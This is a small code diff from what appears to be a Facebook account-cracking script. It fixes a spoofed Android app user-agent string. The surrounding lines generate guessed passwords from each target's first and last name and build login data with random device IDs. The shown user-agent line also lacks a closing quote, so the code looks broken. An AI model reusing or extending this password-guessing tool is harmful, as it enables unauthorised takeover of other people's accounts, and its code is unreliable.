@@ -285,7 +285,7 @@ class iAmMain:
 				ln = fn
 			for ps in pwx:
 				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
-				ua = "[[FBAN/FB4A;FBAV/375.1.0.28.111;FBBV/382948769;FBDM/{density=3.0,width=1080,height=2097};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G990U;FBSV/12;FBOP/1;FBCA/arm64-v8a:armeabi;]
+				ua = "[FBAN/FB4A;FBAV/375.1.0.28.111;FBBV/382948769;FBDM/{density=3.0,width=1080,height=2097};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G990U;FBSV/12;FBOP/1;FBCA/arm64-v8a:armeabi;]
 				data = {"adid": str(uuid.uuid4()),
 "format": "json",
 "device_id": str(uuid.uuid4()),
